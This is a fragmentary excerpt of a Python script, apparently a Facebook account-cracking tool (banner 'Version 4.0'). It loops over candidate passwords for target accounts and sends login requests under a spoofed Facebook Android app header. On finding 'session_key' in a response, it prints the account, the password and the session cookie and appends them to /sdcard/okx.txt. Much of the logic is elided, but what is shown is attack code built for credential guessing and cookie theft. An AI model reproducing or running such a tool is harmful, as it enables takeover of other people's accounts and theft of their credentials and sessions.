...
\033[1;97m Version:\033[1;92m 4.0 \033[1;97m:/
    ...
    def start(user):
     try:
        ...
        for pword in totalpass:              
            heads = "FB4A/FBA;FBAV/626.0.0.579;FBBV/949957037;FBRV/8;FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/;FBSV/9;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"                                
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                ...
                print('\r\033[1;92m[\033[1;92mOK\033[1;92m] \033[1;92m'+acc+' \033[1;92m-\033[1;92m '+pword)
                print(" [🍪] ",coki)
                open('/sdcard/okx.txt','a').write(f'{acc}|{pword}|{coki}\n')
                break
